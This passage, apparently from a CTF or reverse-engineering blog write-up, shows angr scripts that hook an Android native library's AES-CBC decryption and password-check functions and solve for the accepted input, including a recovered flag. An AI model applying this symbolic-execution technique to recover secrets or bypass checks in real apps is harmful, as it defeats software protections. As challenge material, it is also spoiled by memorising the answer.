        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN-INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span><span class="token string">"CALLING ("</span><span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token string">")"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN_INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span>args<span class="token punctuation">)</span>
    ins_len <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size
    st<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip <span class="token operator">+</span> ins_len<span class="token punctuation">)</span>
    it<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">hook_length</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token punctuation">,</span>unhook_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>flag_size <span class="token operator">=</span> flag_size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
        self<span class="token punctuation">.</span>unhook_addr <span class="token operator">=</span> unhook_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> self<span class="token punctuation">.</span>flag_size
        self<span class="token punctuation">.</span>project<span class="token punctuation">.</span>unhook<span class="token punctuation">(</span>self<span class="token punctuation">.</span>unhook_addr<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token comment"># def hook_print_aes_cbc_d_buffer(st):</span>
<span class="token comment">#     sp   = st.regs.esp</span>
<span class="token comment">#     arg0_str = st.memory.load(sp,23,endness=archinfo.Endness.BE)</span>
<span class="token comment">#     byte_str = bytes.fromhex(hex(st.solver.eval(arg0_str))[2:0])</span>

<span class="token comment"># def hook_print_before_memcpy(st):</span>
<span class="token comment">#     sp = st.regs.esp</span>
<span class="token comment">#     arg0 = st.regs.ecx</span>
<span class="token comment">#     arg1 = st.memory.load(sp+4,4,endness=archinfo.Endness.LE)</span>
<span class="token comment">#     arg2 = st.memory.load(sp+8,4,endness=archinfo.Endness.LE)</span>
<span class="token comment">#     print("s1 = ",st.memory.load(arg0,32,endness=archinfo.Endness.BE),"\ns2 = ",st.memory.load(arg1,32,endness=archinfo.Endness.BE),"\nn = ",st.memory.load(arg2,4,endness=archinfo.Endness.LE))</span>

<span class="token keyword">class</span> <span class="token class-name">MyGetStringUTFChars</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>return_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> size   
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># print("[HOOKED-INFO]EIP:",st.regs.eip,"CALLING GetStringUTFChars(",arg0,arg1,arg2,")")</span>
        flag_addr   <span class="token operator">=</span> <span class="token number">0x5000000</span>
        flag_length <span class="token operator">=</span> self<span class="token punctuation">.</span>size
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> flag_addr
        flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># assume len(flag) &lt;= 64</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Decrypt_Key</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x8500</span>
        sp       <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Decrypt_Key"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Basic_Stirng</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x83A0</span>   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Basic_String"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Aes_cbc_decrypt</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x85D0</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"aes_cbc_decrypt"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">AES_init_ctx_iv</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x9640</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"AES_init_ctx_iv"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">AES_CBC_decrypt_buffer</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0xA3D0</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"AES_CBC_decrypt_buffer"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">)</span>

<span class="token comment"># def test_stack(st):</span>
<span class="token comment">#     sp = st.regs.esp</span>
<span class="token comment">#     print("TOP-STACK : ",sp)</span>
<span class="token comment">#     print(st.memory.load(sp,4,endness=archinfo.Endness.LE))</span>
<span class="token comment">#     print(st.memory.load(sp+4,4,endness=archinfo.Endness.LE))</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>flag_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'angr.manager'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./libnative-lib.so'</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9037</span><span class="token punctuation">,</span>MyGetStringUTFChars<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x903D</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9048</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9054</span><span class="token punctuation">,</span>Aes_cbc_decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x85FA</span><span class="token punctuation">,</span>Decrypt_Key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x83D2</span><span class="token punctuation">,</span>hook_length<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x83D7</span><span class="token punctuation">,</span><span class="token number">0x83D2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x875D</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x878E</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8AE9</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>

    <span class="token comment"># OUTPUT SOMETHING</span>
    <span class="token comment"># p.hook(0x8ADE,hook_print_aes_cbc_d_buffer,0)</span>
    <span class="token comment"># p.hook(0x90BA,hook_print_before_memcpy,0)</span>
    
    aes_cbc_decrypt_off  <span class="token operator">=</span> <span class="token number">0x85D0</span>
    aes_cbc_decrypt_find <span class="token operator">=</span> <span class="token number">0x8AE9</span>
    checkPasswords_off   <span class="token operator">=</span> <span class="token number">0x9000</span>
    checkPasswords_find  <span class="token operator">=</span> <span class="token number">0x90BF</span> <span class="token comment"># 0x90BA</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> base <span class="token operator">+</span> checkPasswords_off<span class="token punctuation">)</span>
    <span class="token comment"># 初始化栈</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x8000000</span> <span class="token operator">+</span> <span class="token number">0xC</span> <span class="token comment"># 0xC TO BE Aligned</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> <span class="token number">0x0</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span>checkPasswords_find<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>stashes<span class="token punctuation">)</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sp <span class="token operator">=</span> fd<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># IPython.embed()</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\ns2 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\nn = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag_number <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_number<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FLAG : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
        IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'stove:spill2:drivable:1\x00'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># main(23) # b'stove:spill2:drivable:1\x00'</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>flag_size<span class="token operator">=</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="solve-name-py"><a href="#solve-name-py" class="headerlink" title="solve_name.py"></a>solve_name.py</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ~/.virtualenvs/angr/bin/python</span>
<span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span>SimProcedure<span class="token punctuation">,</span>SIM_PROCEDURES
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> monkeyhex
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> logging

base <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">call</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    st <span class="token operator">=</span> it<span class="token punctuation">.</span>state
    <span class="token keyword">if</span><span class="token punctuation">(</span>args <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN-INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span><span class="token string">"CALLING ("</span><span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token string">")"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN_INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span>args<span class="token punctuation">)</span>
    ins_len <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size
    st<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip <span class="token operator">+</span> ins_len<span class="token punctuation">)</span>
    it<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">EncryptDecryptUsername</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>call_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>call_addr <span class="token operator">=</span> call_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> self<span class="token punctuation">.</span>call_addr   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
